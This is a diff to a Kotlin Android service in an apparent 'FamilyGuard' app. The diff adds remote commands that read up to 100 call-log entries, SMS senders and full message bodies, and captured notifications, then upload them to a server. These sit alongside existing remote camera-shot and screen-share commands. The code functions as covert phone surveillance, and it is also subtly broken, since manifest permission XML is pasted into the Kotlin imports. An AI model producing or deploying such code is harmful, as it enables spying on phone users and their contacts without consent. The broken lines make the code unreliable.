@@ -20,6 +20,8 @@ import org.json.JSONObject
 import java.io.ByteArrayOutputStream
 import java.util.Base64
 import kotlin.concurrent.thread
+<uses-permission android:name="android.permission.READ_CALL_LOG" />
+<uses-permission android:name="android.permission.READ_SMS" />
 
 class ScreenCaptureService : Service() {
 
@@ -201,6 +203,21 @@ class ScreenCaptureService : Service() {
                         if (b64 != null) api.updateStatus(id, "DONE", api.uploadImage(b64))
                         else api.updateStatus(id, "FAILED")
                     }
+                    "CALL_LOGS" -> {
+    val json = getCallLogs()
+    if (json == "[]") api.updateStatus(id, "FAILED")
+    else api.updateStatus(id, "DONE", api.uploadJson(json))
+}
+"SMS_LOGS" -> {
+    val json = getSmsLogs()
+    if (json == "[]") api.updateStatus(id, "FAILED")
+    else api.updateStatus(id, "DONE", api.uploadJson(json))
+}
+"NOTIFICATION_LOGS" -> {
+    val json = FamilyGuardAccessibilityService.getNotifications()
+    if (json == "[]") api.updateStatus(id, "FAILED")
+    else api.updateStatus(id, "DONE", api.uploadJson(json))
+}
                     "SCREEN_SHARE" -> {
                         if (projection == null || reader == null) {
                             api.updateStatus(id, "FAILED"); return@thread
@@ -251,7 +268,84 @@ class ScreenCaptureService : Service() {
         }
         api.updateStatus(id, "DONE", api.uploadJson(arr.toString()))
     }
+    private fun getCallLogs(): String {
+    return try {
+        val arr = org.json.JSONArray()
+        val cursor = contentResolver.query(
+            android.provider.CallLog.Calls.CONTENT_URI,
+            arrayOf(
+                android.provider.CallLog.Calls.NUMBER,
+                android.provider.CallLog.Calls.CACHED_NAME,
+                android.provider.CallLog.Calls.TYPE,
+                android.provider.CallLog.Calls.DURATION,
+                android.provider.CallLog.Calls.DATE
+            ),
+            null, null,
+            "${android.provider.CallLog.Calls.DATE} DESC"
+        )
+        cursor?.use {
+            val numIdx  = it.getColumnIndex(android.provider.CallLog.Calls.NUMBER)
+            val nameIdx = it.getColumnIndex(android.provider.CallLog.Calls.CACHED_NAME)
+            val typeIdx = it.getColumnIndex(android.provider.CallLog.Calls.TYPE)
+            val durIdx  = it.getColumnIndex(android.provider.CallLog.Calls.DURATION)
+            val dateIdx = it.getColumnIndex(android.provider.CallLog.Calls.DATE)
+            var count = 0
+            while (it.moveToNext() && count < 100) {
+                val type = when (it.getInt(typeIdx)) {
+                    android.provider.CallLog.Calls.INCOMING_TYPE  -> "Kiruvchi"
+                    android.provider.CallLog.Calls.OUTGOING_TYPE  -> "Chiquvchi"
+                    android.provider.CallLog.Calls.MISSED_TYPE    -> "O'tkazib yuborilgan"
+                    else -> "Noma'lum"
+                }
+                val date = java.text.SimpleDateFormat("dd.MM.yyyy HH:mm", java.util.Locale.getDefault())
+                    .format(java.util.Date(it.getLong(dateIdx)))
+                arr.put(org.json.JSONObject().apply {
+                    put("number",   it.getString(numIdx)  ?: "")
+                    put("name",     it.getString(nameIdx) ?: "")
+                    put("type",     type)
+                    put("duration", it.getLong(durIdx))
+                    put("date",     date)
+                })
+                count++
+            }
+        }
+        arr.toString()
+    } catch (_: Exception) { "[]" }
+}
 
+private fun getSmsLogs(): String {
+    return try {
+        val arr = org.json.JSONArray()
+        val cursor = contentResolver.query(
+            android.provider.Telephony.Sms.CONTENT_URI,
+            arrayOf(
+                android.provider.Telephony.Sms.ADDRESS,
+                android.provider.Telephony.Sms.PERSON,
+                android.provider.Telephony.Sms.BODY,
+                android.provider.Telephony.Sms.DATE
+            ),
+            null, null,
+            "${android.provider.Telephony.Sms.DATE} DESC"
+        )
+        cursor?.use {
+            val addrIdx = it.getColumnIndex(android.provider.Telephony.Sms.ADDRESS)
+            val bodyIdx = it.getColumnIndex(android.provider.Telephony.Sms.BODY)
+            val dateIdx = it.getColumnIndex(android.provider.Telephony.Sms.DATE)
+            var count = 0
+            while (it.moveToNext() && count < 100) {
+                val date = java.text.SimpleDateFormat("dd.MM.yyyy HH:mm", java.util.Locale.getDefault())
+                    .format(java.util.Date(it.getLong(dateIdx)))
+                arr.put(org.json.JSONObject().apply {
+                    put("number", it.getString(addrIdx) ?: "")
+                    put("body",   it.getString(bodyIdx)  ?: "")
+                    put("date",   date)
+                })
+                count++
+            }
+        }
+        arr.toString()
+    } catch (_: Exception) { "[]" }
+}
     private fun shootCamera(id: String, facing: Int) {
         val b64 = CameraHelper(this).capturePhoto(facing)
         if (b64 != null) api.updateStatus(id, "DONE", api.uploadImage(b64))
